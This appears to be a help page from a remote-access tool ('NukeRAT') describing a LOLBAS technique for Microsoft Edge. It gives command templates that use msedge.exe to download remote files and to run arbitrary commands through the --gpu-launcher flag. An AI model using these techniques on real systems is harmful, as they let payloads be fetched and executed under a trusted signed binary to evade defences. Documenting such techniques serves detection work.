ABOUT
    Microsoft Edge browser. LOLBAS documents download file from the
    internet and executes a process under a trusted Microsoft signed
    binary.

USAGE:
    msedge.exe {REMOTEURL:.exe.txt}
    msedge.exe --headless --enable-logging --disable-gpu --dump-dom "{REMOTEURL:.base64.html}" > {PATH:.b64}
    msedge.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"

EXAMPLES:
    msedge.exe {REMOTEURL:.exe.txt}
    msedge.exe --headless --enable-logging --disable-gpu --dump-dom "{REMOTEURL:.base64.html}" > {PATH:.b64}
    msedge.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"

NUKERAT FLAGS:
    -w <seconds>    Maximum wait time until timeout
    -bg             Fork and run without waiting for output

    Example:
    msedge.exe {REMOTEURL:.exe.txt}
